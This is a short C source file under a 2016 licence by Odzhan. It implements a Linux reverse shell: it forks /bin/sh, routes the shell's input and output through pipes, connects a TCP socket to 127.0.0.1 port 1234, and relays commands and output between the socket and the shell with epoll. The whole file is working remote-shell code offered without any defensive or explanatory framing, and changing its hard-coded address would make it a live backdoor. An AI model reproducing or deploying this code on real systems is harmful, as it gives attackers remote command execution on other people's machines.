/**
  Copyright © 2016 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#include "z.h"

typedef struct _args_t {
  int in[2], out[2];
  pid_t pid;
} args_t;

void main(int argc, char *argv[])
{
    struct sockaddr_in sa;
    u_long      ip=0x0100007F;
    int         in[2], out[2];
    pid_t       pid;
    char        *pargv[2];
    char        buf[BUFSIZ];
    
    int         efd, end, n, i, r, s, h[2];
    struct      epoll_event evt;
    struct      epoll_event *evts;
    
    // create pipes for redirection of stdin/stdout/stderr
    pipe(in);
    pipe(out);

    // create /bin/sh as child process
    pid=fork();
    
    if (!pid) {
      dup2( in[0], STDIN_FILENO);
      dup2(out[1], STDOUT_FILENO);
      dup2(out[1], STDERR_FILENO);
      
      close(in[0]);
      close(in[1]);
      
      close(out[0]);
      close(out[1]);
      
      pargv[0]="/bin/sh";
      pargv[1]=NULL;
      
      execve("/bin/sh", pargv, NULL);
    } else {      
      close(in[0]);
      close(out[1]);
      
      // create a socket
      s=socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
      
      sa.sin_family = AF_INET;
      sa.sin_port   = htons(1234);
      memcpy (&sa.sin_addr, &ip, sizeof(ip));
      
      // attempt connection to remote host
      connect(s, (struct sockaddr*)&sa, sizeof(sa));
      
      efd=epoll_create1(0);
      
      h[0] = s;
      h[1] = out[0];
      
      // add 2 descriptors to monitor
      for (i=0; i<2; i++)
      {
        evt.data.fd = h[i];
        evt.events  = EPOLLIN;
        
        epoll_ctl(efd, EPOLL_CTL_ADD, h[i], &evt);
      }
      
      // allocate mem for events
      evts=(struct epoll_event*)mmap(NULL, 
        32 * sizeof(struct epoll_event), PROT_READ | PROT_WRITE,
        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        
      // now loop until user exits or some other error
      for (end=0; !end;)
      {
        r=epoll_wait(efd, evts, 32, -1);
        
        if (r<0) break;
        
        for (i=0; i<r; i++) 
        {
          // disconnection/error?
          if ((evts[i].events & EPOLLERR) ||
              (evts[i].events & EPOLLHUP)) 
          {
            end=1;
          } else 
          // read is available?
          if (evts[i].events & EPOLLIN) 
          {
            // socket?
            if (evts[i].data.fd == s)
            {
              r=read(s, buf, BUFSIZ);
              write(in[1], buf, r);
            } else {
              // stdout/stderr
              r=read(out[0], buf, BUFSIZ);
              write(s, buf, r);
            }
          }
        }
      }
      munmap(evts, 32*sizeof(struct epoll_event));
      kill(pid, SIGCHLD);
      close(s);
    }
    close(in[1]);
    close(out[1]);
    
    exit(0);
}
    
